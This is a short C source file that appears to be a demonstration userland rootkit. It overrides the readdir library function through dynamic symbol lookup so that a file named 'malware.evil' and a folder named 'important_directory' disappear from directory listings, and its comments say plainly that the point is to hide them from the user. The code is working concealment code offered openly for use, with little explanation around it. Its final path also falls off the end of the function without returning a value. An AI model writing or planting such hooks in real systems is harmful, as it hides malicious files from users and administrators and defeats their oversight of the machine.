#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <stdlib.h>

// define readdir structure
typedef struct dirent* (*orig_readdir)(DIR *dir);

struct dirent *readdir(DIR *dir) {
    // find address of original readdir function
    orig_readdir orig_readdir_inst;
    orig_readdir_inst = dlsym(RTLD_NEXT, "readdir");

    // keep calling original function until i have read all files
    struct dirent* return_file;
    while((return_file = orig_readdir_inst(dir)) != NULL) {
        // detect file names, can do whatever i want with them at this point
	// simply filter a file and directory away from the user
        if(strcmp(return_file->d_name, "malware.evil") == 0 || strcmp(return_file->d_name, "important_directory") == 0){
	    continue;
        }
        return return_file;
    }
}
